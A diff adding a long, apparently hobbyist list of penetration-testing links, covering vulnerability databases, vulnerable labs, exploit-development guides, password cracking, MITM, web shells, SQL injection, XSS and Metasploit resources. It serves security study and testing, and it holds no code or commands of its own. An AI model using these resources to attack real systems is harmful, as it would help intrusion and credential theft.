+    http://www.packetstormsecurity.org/
+    http://www.securityforest.com/wiki/index.php/Main_Page
+    http://www.securityfocus.com/bid
+    http://nvd.nist.gov/
+    http://osvdb.org/
+    http://www.nullbyte.org.il/Index.html
+    http://secdocs.lonerunners.net/
+    http://www.phenoelit-us.org/whatSAP/index.html
+    http://secunia.com/
+    http://cve.mitre.org/ 
+
+Cheatsheets and Syntax:
+
+    http://cirt.net/ports_dl.php?export=services
+    http://www.cheat-sheets.org/
+    http://blog.securitymonks.com/2009/08/15/whats-in-your-folder-security-cheat-sheets/ 
+
+    Agile Hacking:
+
+    http://www.gnucitizen.org/blog/agile-hacking-a-homegrown-telnet-based-portscanner/
+    http://blog.commandlinekungfu.com/
+    http://www.securityaegis.com/simple-yet-effective-directory-bruteforcing/
+    http://isc.sans.edu/diary.html?storyid=2376
+    http://isc.sans.edu/diary.html?storyid=1229
+    http://ss64.com/nt/
+    http://pauldotcom.com/2010/02/running-a-command-on-every-mac.html
+    http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html
+    http://www.zonbi.org/2010/06/09/wmic-the-other-other-white-meat/
+    http://rstcenter.com/forum/22324-hacking-without-tools-windows.rst
+    http://www.coresecurity.com/files/attachments/Core_Define_and_Win_Cmd_Line.pdf
+    http://www.scribd.com/Penetration-Testing-Ninjitsu2-Infrastructure-and-Netcat-without-Netcat/d/3064507
+    http://www.pentesterscripting.com/
+    http://www.sans.org/reading_room/whitepapers/hackers/windows-script-host-hack-windows_33583
+    http://www.blackhat.com/presentations/bh-dc-10/Bannedit/BlackHat-DC-2010-Bannedit-Advanced-Command-Injection-Exploitation-1-wp.pdf 
+
+    OS and Scripts:
+
+    http://en.wikipedia.org/wiki/IPv4_subnetting_reference
+    http://www.nixtutor.com/linux/all-the-best-linux-cheat-sheets/
+    http://shelldorado.com/shelltips/beginner.html
+    http://www.linuxsurvival.com/
+    http://mywiki.wooledge.org/BashPitfalls
+    http://rubular.com/
+    http://www.iana.org/assignments/port-numbers
+    http://www.robvanderwoude.com/ntadmincommands.php
+    http://www.nixtutor.com/linux/all-the-best-linux-cheat-sheets/ 
+
+    Tools:
+
+    http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
+    http://www.secguru.com/files/cheatsheet/nessusNMAPcheatSheet.pdf
+    http://sbdtools.googlecode.com/files/hping3_cheatsheet_v1.0-ENG.pdf
+    http://sbdtools.googlecode.com/files/Nmap5%20cheatsheet%20eng%20v1.pdf
+    http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+    http://rmccurdy.com/scripts/Metasploit%20meterpreter%20cheat%20sheet%20reference.html
+    http://h.ackack.net/cheat-sheets/netcat 
+
+Distros:
+
+    http://www.backtrack-linux.org/
+    http://www.matriux.com/
+    http://samurai.inguardians.com/
+    http://www.owasp.org/index.php/Category:OWASP_Live_CD_Project
+    https://pentoo.ch/
+    http://www.hackfromacave.com/articles_and_adventures/katana_v2_release.html
+    http://www.piotrbania.com/all/kon-boot/
+    http://www.linuxfromscratch.org/
+    http://sumolinux.suntzudata.com/
+    http://blog.0x0e.org/2009/11/20/pentesting-with-an-ubuntu-box/#comments
+    http://www.backbox.org/ 
+
+Labs:
+
+    ISOs and VMs:
+
+    http://sourceforge.net/projects/websecuritydojo/
+    http://code.google.com/p/owaspbwa/wiki/ProjectSummary
+    http://heorot.net/livecds/
+    http://informatica.uv.es/~carlos/docencia/netinvm/
+    http://www.bonsai-sec.com/en/research/moth.php
+    http://blog.metasploit.com/2010/05/introducing-metasploitable.html
+    http://pynstrom.net/holynix.php
+    http://gnacktrack.co.uk/download.php
+    http://sourceforge.net/projects/lampsecurity/files/
+    https://www.hacking-lab.com/news/newspage/livecd-v4.3-available.html
+    http://sourceforge.net/projects/virtualhacking/files/
+    http://www.badstore.net/
+    http://www.irongeek.com/i.php?page=security/mutillidae-deliberately-vulnerable-php-owasp-top-10
+    http://www.dvwa.co.uk/
+    http://sourceforge.net/projects/thebutterflytmp/ 
+
+    Vulnerable Software:
+
+    http://www.oldapps.com/
+    http://www.oldversion.com/
+    http://www.exploit-db.com/webapps/
+    http://code.google.com/p/wavsep/downloads/list
+    http://www.owasp.org/index.php/Owasp_SiteGenerator
+    http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx
+    http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx
+    http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx
+    http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx 
+    http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx
+
+    Test Sites:
+
+    http://www.webscantest.com/
+    http://crackme.cenzic.com/Kelev/view/home.php
+    http://zero.webappsecurity.com/banklogin.asp?serviceName=FreebankCaastAccess&templateName=prod_sel.forte&source=Freebank&AD_REFERRING_URL=http://www.Freebank.com
+    http://testaspnet.vulnweb.com/
+    http://testasp.vulnweb.com/
+    http://testphp.vulnweb.com/
+    http://demo.testfire.net/
+    http://hackme.ntobjectives.com/ 
+
+Exploitation Intro:
+
+If you'd like to get into exploit dev, these are really the guides and docs that will start you off in the right direction. Since Exploit dev is not my primary occupation this section could always use help.
+
+    http://myne-us.blogspot.com/2010/08/from-0x90-to-0x4c454554-journey-into.html
+    http://www.mgraziano.info/docs/stsi2010.pdf
+    http://www.abysssec.com/blog/2010/05/past-present-future-of-windows-exploitation/
+    http://www.ethicalhacker.net/content/view/122/2/
+    http://code.google.com/p/it-sec-catalog/wiki/Exploitation
+    http://x9090.blogspot.com/2010/03/tutorial-exploit-writting-tutorial-from.html
+    http://ref.x86asm.net/index.html 
+
+Reverse Engineering & Malware:
+
+    http://www.woodmann.com/TiGa/idaseries.html
+    http://www.binary-auditing.com/
+    http://visi.kenshoto.com/
+    http://www.radare.org/y/
+    http://www.offensivecomputing.net/ 
+
+Passwords and Hashes:
+
+    http://www.irongeek.com/i.php?page=videos/password-exploitation-class
+    http://cirt.net/passwords
+    http://sinbadsecurity.blogspot.com/2008/10/ms-sql-server-password-recovery.html
+    http://www.foofus.net/~jmk/medusa/medusa-smbnt.html
+    http://www.foofus.net/?page_id=63
+    http://hashcrack.blogspot.com/
+    http://www.nirsoft.net/articles/saved_password_location.html
+    http://www.onlinehashcrack.com/
+    http://www.md5this.com/list.php?
+    http://www.virus.org/default-password
+    http://www.phenoelit-us.org/dpl/dpl.html
+    http://news.electricalchemy.net/2009/10/cracking-passwords-in-cloud.html 
+
+    Wordlists:
+
+        http://contest.korelogic.com/wordlists.html
+        http://packetstormsecurity.org/Crackers/wordlists/
+        http://www.skullsecurity.org/wiki/index.php/Passwords
+        http://www.ericheitzman.com/passwd/passwords/ 
+
+    Pass the Hash:
+
+        http://www.sans.org/reading_room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation_33283
+        http://www.sans.org/reading_room/whitepapers/testing/crack-pass-hash_33219
+        http://carnal0wnage.blogspot.com/2008/03/using-pash-hash-toolkit.html 
+
+MiTM:
+
+    http://www.giac.org/certified_professionals/practicals/gsec/0810.php
+    http://www.linuxsecurity.com/docs/PDF/dsniff-n-mirror.pdf
+    http://www.cs.uiuc.edu/class/sp08/cs498sh/slides/dsniff.pdf
+    http://www.techvibes.com/blog/a-hackers-story-let-me-tell-you-just-how-easily-i-can-steal-your-personal-data
+    http://www.mindcenter.net/uploads/ECCE101.pdf
+    http://toorcon.org/pres12/3.pdf
+    http://media.techtarget.com/searchUnifiedCommunications/downloads/Seven_Deadliest_UC_Attacks_Ch3.pdf
+    http://packetstormsecurity.org/papers/wireless/cracking-air.pdf
+    http://www.blackhat.com/presentations/bh-europe-03/bh-europe-03-valleri.pdf
+    http://www.oact.inaf.it/ws-ssri/Costa.pdf
+    http://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-sam_bowne-hijacking_web_2.0.pdf
+    http://mcafeeseminar.com/focus/downloads/Live_Hacking.pdf
+    http://www.seanobriain.com/docs/PasstheParcel-MITMGuide.pdf
+    http://www.more.net/sites/default/files/2010JohnStrandKeynote.pdf
+    http://www.leetupload.com/database/Misc/Papers/Asta%20la%20Vista/18.Ettercap_Spoof.pdf
+    http://bandwidthco.com/whitepapers/netforensics/arp/EtterCap%20ARP%20Spoofing%20&%20Beyond.pdf
+    http://bandwidthco.com/whitepapers/netforensics/arp/Fun%20With%20EtterCap%20Filters.pdf
+    http://www.iac.iastate.edu/iasg/libarchive/0910/The_Magic_of_Ettercap/The_Magic_of_Ettercap.pdf
+    http://articles.manugarg.com/arp_spoofing.pdf
+    http://academy.delmar.edu/Courses/ITSY2430/eBooks/Ettercap(ManInTheMiddleAttack-tool).pdf
+    http://www.ucci.it/docs/ICTSecurity-2004-26.pdf
+    http://web.mac.com/opticrealm/iWeb/asurobot/My%20Cyber%20Attack%20Papers/My%20Cyber%20Attack%20Papers_files/ettercap_Nov_6_2005-1.pdf
+    http://blog.spiderlabs.com/2010/12/thicknet.html
+    http://www.hackyeah.com/2010/10/ettercap-filters-with-metasploit-browser_autopwn/
+    http://www.go4expert.com/forums/showthread.php?t=11842
+    http://www.irongeek.com/i.php?page=security/ettercapfilter
+    http://openmaniak.com/ettercap_filter.php
+    http://www.irongeek.com/i.php?page=videos/dns-spoofing-with-ettercap-pharming
+    http://www.irongeek.com/i.php?page=videos/ettercap-plugins-find-ip-gw-discover-isolate
+    http://www.irongeek.com/i.php?page=videos/ettercapfiltervid1
+    http://spareclockcycles.org/2010/06/10/sergio-proxy-released/ 
+
+Tools:
+
+    OSINT:
+
+        http://www.edge-security.com/theHarvester.php
+        http://www.mavetju.org/unix/dnstracer-man.php
+        http://www.paterva.com/web5/ 
+
+        Metadata:
+
+            http://www.sans.org/reading_room/whitepapers/privacy/document-metadata-silent-killer_32974
+            http://lcamtuf.coredump.cx/strikeout/
+            http://www.sno.phy.queensu.ca/~phil/exiftool/
+            http://www.edge-security.com/metagoofil.php
+            http://www.darkoperator.com/blog/2009/4/24/metadata-enumeration-with-foca.html 
+
+    Google Hacking:
+
+        http://www.stachliu.com/index.php/resources/tools/google-hacking-diggity-project/
+        http://midnightresearch.com/projects/search-engine-assessment-tool/#downloads
+        http://sqid.rubyforge.org/#next
+        http://voidnetwork.org/5ynL0rd/darkc0de/python_script/dorkScan.html 
+
+    Web:
+
+        http://www.bindshell.net/tools/beef
+        http://blindelephant.sourceforge.net/
+        http://xsser.sourceforge.net/
+        http://sourceforge.net/projects/rips-scanner/
+        http://www.divineinvasion.net/authforce/
+        http://andlabs.org/tools.html#sotf
+        http://www.taddong.com/docs/Browser_Exploitation_for_Fun&Profit_Taddong-RaulSiles_Nov2010_v1.1.pdf
+        http://carnal0wnage.blogspot.com/2007/07/using-sqid-sql-injection-digger-to-look.html
+        http://code.google.com/p/pinata-csrf-tool/
+        http://xsser.sourceforge.net/#intro
+        http://www.contextis.co.uk/resources/tools/clickjacking-tool/
+        http://packetstormsecurity.org/files/view/69896/unicode-fun.txt
+        http://sourceforge.net/projects/ws-attacker/files/
+        https://github.com/koto/squid-imposter 
+
+        Attack Strings:
+
+            http://code.google.com/p/fuzzdb/
+            http://www.owasp.org/index.php/Category:OWASP_Fuzzing_Code_Database#tab=Statements 
+
+        Shells:
+
+            http://sourceforge.net/projects/yokoso/
+            http://sourceforge.net/projects/ajaxshell/ 
+
+        Scanners:
+
+            http://w3af.sourceforge.net/
+            http://code.google.com/p/skipfish/
+            http://sqlmap.sourceforge.net/
+            http://sqid.rubyforge.org/#next
+            http://packetstormsecurity.org/UNIX/scanners/XSSscan.py.txt
+            http://code.google.com/p/fimap/wiki/WindowsAttack
+            http://code.google.com/p/fm-fsf/ 
+
+        Proxies:
+
+            Burp:
+
+                http://www.sans.org/reading_room/whitepapers/testing/fuzzing-approach-credentials-discovery-burp-intruder_33214
+                http://www.gdssecurity.com/l/b/2010/08/10/constricting-the-web-the-gds-burp-api/
+                http://sourceforge.net/projects/belch/files/
+                http://www.securityninja.co.uk/application-security/burp-suite-tutorial-repeater-and-comparer-tools
+                http://blog.ombrepixel.com/
+                http://andlabs.org/tools.html#dser
+                http://feoh.tistory.com/22 
+
+            http://www.sensepost.com/labs/tools/pentest/reduh
+            http://www.owasp.org/index.php/OWASP_WebScarab_NG_Project
+            http://intrepidusgroup.com/insight/mallory/
+            http://www.fiddler2.com/fiddler2/
+            http://websecuritytool.codeplex.com/documentation?referringTitle=Home
+            http://translate.google.com/translate?hl=en&sl=es&u=http://xss.codeplex.com/releases/view/43170&prev=/search%3Fq%3Dhttp://www.hackingeek.com/2010/08/x5s-encuentra-fallos-xss-lfi-rfi-en-tus.html%26hl%3Den&rurl=translate.google.com&twu=1 
+
+    Social Engineering:
+
+        http://www.secmaniac.com/ 
+
+    Password:
+
+        http://nmap.org/ncrack/
+        http://www.foofus.net/~jmk/medusa/medusa.html
+        http://www.openwall.com/john/
+        http://ophcrack.sourceforge.net/
+        http://blog.0x3f.net/tool/keimpx-in-action/
+        http://code.google.com/p/keimpx/
+        http://sourceforge.net/projects/hashkill/ 
+
+    Metasploit:
+
+    http://www.indepthdefense.com/2009/02/reverse-pivots-with-metasploit-how-not.html
+    http://code.google.com/p/msf-hack/wiki/WmapNikto
+    http://www.indepthdefense.com/2009/01/metasploit-visual-basic-payloads-in.html
+    http://seclists.org/metasploit/
+    http://pauldotcom.com/2010/03/nessus-scanning-through-a-meta.html
+    http://meterpreter.illegalguy.hostzi.com/
+    http://blog.metasploit.com/2010/03/automating-metasploit-console.html
+    http://www.workrobot.com/sansfire2009/561.html
+    http://www.securitytube.net/video/711
+    http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient#download
+    http://vimeo.com/16852783
+    http://milo2012.wordpress.com/2009/09/27/xlsinjector/
+    http://www.fastandeasyhacking.com/
+    http://trac.happypacket.net/
+    http://www.blackhat.com/presentations/bh-dc-10/Ames_Colin/BlackHat-DC-2010-colin-david-neurosurgery-with-meterpreter-wp.pdf
+    http://www.blackhat.com/presentations/bh-dc-10/Egypt/BlackHat-DC-2010-Egypt-UAV-slides.pdf 
+
+    MSF Exploits or Easy:
+
+    http://www.nessus.org/plugins/index.php?view=single&id=12204
+    http://www.nessus.org/plugins/index.php?view=single&id=11413
+    http://www.nessus.org/plugins/index.php?view=single&id=18021
+    http://www.nessus.org/plugins/index.php?view=single&id=26918
+    http://www.nessus.org/plugins/index.php?view=single&id=34821
+    http://www.nessus.org/plugins/index.php?view=single&id=22194
+    http://www.nessus.org/plugins/index.php?view=single&id=34476
+    http://www.nessus.org/plugins/index.php?view=single&id=25168
+    http://www.nessus.org/plugins/index.php?view=single&id=19408
+    http://www.nessus.org/plugins/index.php?view=single&id=21564
+    http://www.nessus.org/plugins/index.php?view=single&id=10862
+    http://www.nessus.org/plugins/index.php?view=single&id=26925
+    http://www.nessus.org/plugins/index.php?view=single&id=29314
+    http://www.nessus.org/plugins/index.php?view=single&id=23643
+    http://www.nessus.org/plugins/index.php?view=single&id=12052
+    http://www.nessus.org/plugins/index.php?view=single&id=12052
+    http://www.nessus.org/plugins/index.php?view=single&id=34477
+    http://www.nessus.org/plugins/index.php?view=single&id=15962
+    http://www.nessus.org/plugins/index.php?view=single&id=42106
+    http://www.nessus.org/plugins/index.php?view=single&id=15456
+    http://www.nessus.org/plugins/index.php?view=single&id=21689
+    http://www.nessus.org/plugins/index.php?view=single&id=12205
+    http://www.nessus.org/plugins/index.php?view=single&id=22182
+    http://www.nessus.org/plugins/index.php?view=single&id=26919
+    http://www.nessus.org/plugins/index.php?view=single&id=26921
+    http://www.nessus.org/plugins/index.php?view=single&id=21696
+    http://www.nessus.org/plugins/index.php?view=single&id=40887
+    http://www.nessus.org/plugins/index.php?view=single&id=10404
+    http://www.nessus.org/plugins/index.php?view=single&id=18027
+    http://www.nessus.org/plugins/index.php?view=single&id=19402
+    http://www.nessus.org/plugins/index.php?view=single&id=11790
+    http://www.nessus.org/plugins/index.php?view=single&id=12209
+    http://www.nessus.org/plugins/index.php?view=single&id=10673 
+
+    NSE:
+
+    http://www.securitytube.net/video/931
+    http://nmap.org/nsedoc/ 
+
+    Net Scanners and Scripts:
+
+    http://nmap.org/
+    http://asturio.gmxhome.de/software/sambascan2/i.html
+    http://www.softperfect.com/products/networkscanner/
+    http://www.openvas.org/
+    http://tenable.com/products/nessus
+    http://www.rapid7.com/vulnerability-scanner.jsp
+    http://www.eeye.com/products/retina/community 
+
+    Online Port Scanners:
+    
+    http://www.t1shopper.com/tools/port-scan/
+    http://nmap-online.com/
+    http://labs.programming-designs.com/portscanner/
+
+    Post Exploitation:
+
+    http://www.awarenetwork.org/home/rattle/source/python/exe2bat.py
+    http://www.phx2600.org/archive/2008/08/29/metacab/
+    http://www.room362.com/blog/2011/9/6/post-exploitation-command-lists.html 
+
+    Netcat:
+
+    http://readlist.com/lists/insecure.org/nmap-dev/1/7779.html
+    http://www.radarhack.com/tutorial/ads.pdf
+    http://www.infosecwriters.com/text_resources/pdf/Netcat_for_the_Masses_DDebeer.pdf
+    http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
+    http://www.dest-unreach.org/socat/
+    http://www.antionline.com/archive/index.php/t-230603.html
+    http://technotales.wordpress.com/2009/06/14/netcat-tricks/
+    http://seclists.org/nmap-dev/2009/q1/581
+    http://www.terminally-incoherent.com/blog/2007/08/07/few-useful-netcat-tricks/
+    http://www.inguardians.com/research/docs/Skoudis_pentestsecrets.pdf
+    http://gse-compliance.blogspot.com/2008/07/netcat.html 
+
+    Source Inspection:
+
+    http://www.justanotherhacker.com/projects/graudit.html
+    http://code.google.com/p/javasnoop/ 
+
+    Firefox Addons:
+
+    https://addons.mozilla.org/id/firefox/collections/byrned/pentesting/?page=8
+    https://addons.mozilla.org/en-US/firefox/addon/osvdb/
+    https://addons.mozilla.org/en-US/firefox/addon/packet-storm-search-plugin/
+    https://addons.mozilla.org/en-US/firefox/addon/default-passwords-cirtne-58786/
+    https://addons.mozilla.org/en-US/firefox/addon/offsec-exploit-db-search/
+    https://addons.mozilla.org/en-US/firefox/addon/oval-repository-search-plugin/
+    https://addons.mozilla.org/en-US/firefox/addon/cve-dictionary-search-plugin/
+    https://addons.mozilla.org/en-US/firefox/addon/hackbar/ 
+
+    Tool Listings:
+
+    http://packetstormsecurity.org/files/tags/tool
+    http://tools.securitytube.net/index.php?title=Main_Page 
+
+Training/Classes:
+
+    Sec/Hacking:
+
+    http://pentest.cryptocity.net/
+    http://www.irongeek.com/i.php?page=videos/network-sniffers-class
+    http://samsclass.info/124/124_Sum09.shtml
+    http://www.cs.ucsb.edu/~vigna/courses/cs279/
+    http://crypto.stanford.edu/cs142/
+    http://crypto.stanford.edu/cs155/
+    http://cseweb.ucsd.edu/classes/wi09/cse227/
+    http://www-inst.eecs.berkeley.edu/~cs161/sp11/
+    http://security.ucla.edu/pages/Security_Talks
+    http://www.cs.rpi.edu/academics/courses/spring10/csci4971/
+    http://cr.yp.to/2004-494.html
+    http://www.ece.cmu.edu/~dbrumley/courses/18732-f09/
+    https://noppa.tkk.fi/noppa/kurssi/t-110.6220/luennot
+    http://stuff.mit.edu/iap/2009/#websecurity 
+
+    Metasploit:
+
+    http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training
+    http://www.irongeek.com/i.php?page=videos/metasploit-class
+    http://www.ethicalhacker.net/component/option,com_smf/Itemid,54/topic,6158.0/
+    http://vimeo.com/16925188
+    http://www.ustream.tv/recorded/13396511
+    http://www.ustream.tv/recorded/13397426
+    http://www.ustream.tv/recorded/13398740 
+
+    Programming:
+
+        Python:
+
+    http://code.google.com/edu/languages/google-python-class/index.html
+    http://www.swaroopch.com/notes/Python_en:Table_of_Contents
+    http://www.thenewboston.com/?cat=40&pOpen=tutorial
+    http://showmedo.com/videotutorials/python
+    http://www.catonmat.net/blog/learning-python-programming-language-through-video-lectures/ 
+
+    Ruby:
+
+    http://www.tekniqal.com/ 
+
+    Other Misc:
+
+    http://www.cs.sjtu.edu.cn/~kzhu/cs490/
+    https://noppa.tkk.fi/noppa/kurssi/t-110.6220/luennot/
+    http://i-web.i.u-tokyo.ac.jp/edu/training/ss/lecture/new-documents/Lectures/
+    http://resources.infosecinstitute.com/
+    http://vimeo.com/user2720399 
+
+Web Vectors
+
+    SQLi:
+
+    http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/
+    http://isc.sans.edu/diary.html?storyid=9397
+    http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
+    http://www.evilsql.com/main/index.php
+    http://xd-blog.com.ar/descargas/manuales/bugs/full-mssql-injection-pwnage.html
+    http://securityoverride.com/articles.php?article_id=1&article=The_Complete_Guide_to_SQL_Injections
+    http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
+    http://sqlzoo.net/hack/
+    http://www.sqlteam.com/article/sql-server-versions
+    http://www.krazl.com/blog/?p=3
+    http://www.owasp.org/index.php/Testing_for_MS_Access
+    http://web.archive.org/web/20101112061524/http://seclists.org/pen-test/2003/May/0074.html
+    http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html
+    http://www.youtube.com/watch?v=WkHkryIoLD0
+    http://layerone.info/archives/2009/Joe%20McCray%20-%20Advanced%20SQL%20Injection%20-%20L1%202009.pdf
+    http://vimeo.com/3418947
+    http://sla.ckers.org/forum/read.php?24,33903
+    http://websec.files.wordpress.com/2010/11/sqli2.pdf
+    http://old.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/
+    http://ha.ckers.org/sqlinjection/
+    http://lab.mediaservice.net/notes_more.php?id=MSSQL 
+
+    Upload Tricks:
+
+    http://www.google.com/#hl=en&q=bypassing+upload+file+type&start=40&sa=N&fp=a2bb30ecf4f91972
+    http://blog.skeptikal.org/2009/11/adobe-responds-sort-of.html
+    http://blog.insicdesigns.com/2009/01/secure-file-upload-in-php-web-applications/
+    http://perishablepress.com/press/2006/01/10/stupid-htaccess-tricks/
+    http://ex.ploit.net/f20/tricks-tips-bypassing-image-uploaders-t3hmadhatt3r-38/
+    http://www.ravenphpscripts.com/article2974.html
+    http://www.acunetix.com/cross-site-scripting/scanner.htm
+    http://www.vupen.com/english/advisories/2009/3634
+    http://msdn.microsoft.com/en-us/library/aa478971.aspx
+    http://dev.tangocms.org/issues/237
+    http://seclists.org/fulldisclosure/2006/Jun/508
+    http://www.gnucitizen.org/blog/cross-site-file-upload-attacks/
+    http://www.ipolicynetworks.com/technology/files/TikiWiki_jhot.php_Script_File_Upload_Security_Bypass_Vulnerability.html
+    http://shsc.info/FileUploadSecurity 
+
+    LFI/RFI:
+
+    http://pastie.org/840199
+    http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
+    http://www.notsosecure.com/folder2/2010/08/20/lfi-code-exec-remote-root/?utm_source=twitterfeed&utm_medium=twitter
+    http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/
+    http://www.digininja.org/blog/when_all_you_can_do_is_read.php 
+
+    XSS:
+
+    http://www.infosecwriters.com/hhworld/hh8/csstut.htm
+    http://www.technicalinfo.net/papers/CSS.html
+    http://msmvps.com/blogs/alunj/archive/2010/07/07/1773441.aspx
+    http://forum.intern0t.net/web-hacking-war-games/112-cross-site-scripting-attack-defense-guide.html
+    https://media.blackhat.com/bh-eu-10/presentations/Lindsay_Nava/BlackHat-EU-2010-Lindsay-Nava-IE8-XSS-Filters-slides.pdf
+    http://sirdarckcat.blogspot.com/2009/08/our-favorite-xss-filters-and-how-to.html
+    http://www.securityaegis.com/filter-evasion-houdini-on-the-wire/
+    http://heideri.ch/jso/#javascript
+    http://www.reddit.com/r/xss/
+    http://sla.ckers.org/forum/list.php?2 
+
+    Coldfusion:
+
+    http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+    http://zastita.com/02114/Attacking_ColdFusion..html
+    http://www.nosec.org/2010/0809/629.html
+    http://h30507.www3.hp.com/t5/Following-the-White-Rabbit-A/Adobe-ColdFusion-s-Directory-Traversal-Disaster/ba-p/81964
+    http://cfunited.com/2009/files/presentations/254_ShlomyGantz_August2009_HackProofingColdFusion.pdf 
+
+    Sharepoint:
+
+    http://www.ethicalhacker.net/component/option,com_smf/Itemid,54/topic,6131.msg32678/#msg32678 
+
+    Lotus:
+
+    http://blog.ombrepixel.com/post/2009/05/06/Lotus-Notes/Domino-Security
+    http://seclists.org/pen-test/2002/Nov/43
+    http://www.sectechno.com/2010/07/12/hacking-lotus-domino/? 
+
+    JBoss:
+
+    http://www.nruns.com/_downloads/Whitepaper-Hacking-jBoss-using-a-Browser.pdf
+    http://blog.mindedsecurity.com/2010/04/good-bye-critical-jboss-0day.html 
+
+    VMWare Web:
+
+    http://www.metasploit.com/modules/auxiliary/scanner/http/vmware_server_dir_trav 
+
+    Oracle App Servers:
+
+    http://www.hideaway.net/2007/07/hacking-oracle-application-servers.html
+    http://www.owasp.org/index.php/Testing_for_Oracle
+    http://www.ngssoftware.com/services/software-products/internet-security/orascan.aspx
+    http://www.ngssoftware.com/services/software-products/Database-Security/NGSSQuirreLOracle.aspx
+    http://www.ngssoftware.com/papers/hpoas.pdf 
+
+    SAP:
+
+    http://www.onapsis.com/research.html#bizploit
+    http://marc.info/?l=john-users&m=121444075820309&w=2
+    http://www.phenoelit-us.org/whatSAP/index.html 
+
+Wireless:
+
+    http://code.google.com/p/pyrit/ 
+
+Capture the Flag/Wargames:
+
+    http://intruded.net/
+    http://smashthestack.org/
+    http://flack.hkpco.kr/
+    http://ctf.hcesperer.org/
+    http://ictf.cs.ucsb.edu/
+    http://capture.thefl.ag/calendar/ 
+
+
+Security Search Engines:
+	https://censys.io/
+	https://viz.greynoise.io/table
+	https://www.zoomeye.org/
+	https://buckets.grayhatwarfare.com/
+	https://dnsdumpster.com/
+
+
+Conferences:
+
+    https://www.google.com/calendar/embed?src=pe2ikdbe6b841od6e26ato0asc@group.calendar.google.com&gsessionid=OK 
+
+Misc/Unsorted:
+
+    http://www.ikkisoft.com/stuff/SMH_XSS.txt
+    http://securestate.blogspot.com/2010/08/xfs-101-cross-frame-scripting-explained.html?utm_source=twitterfeed&utm_medium=twitter
+    http://whatthefuckismyinformationsecuritystrategy.com/
+    http://video.google.com/videoplay?docid=4379894308228900017&q=owasp#
+    http://video.google.com/videoplay?docid=4994651985041179755&ei=_1k4TKj-PI-cqAPioJnKDA&q=deepsec#
+    http://www.sensepost.com/blog/4552.html
+    http://blog.zenone.org/2009/03/pci-compliance-disable-sslv2-and-weak.html
+    http://threatpost.com/en_us/blogs/hd-moore-metasploit-exploitation-and-art-pen-testing-040210
+    http://carnal0wnage.attackresearch.com/node/410
+    http://www.cs.ucsb.edu/~adoupe/static/black-box-scanners-dimva2010.pdf
+    http://www.spy-hunter.com/Database_Pen_Testing_ISSA_March_25_V2.pdf
+    http://perishablepress.com/press/2006/01/10/stupid-htaccess-tricks/ 
+
+
+
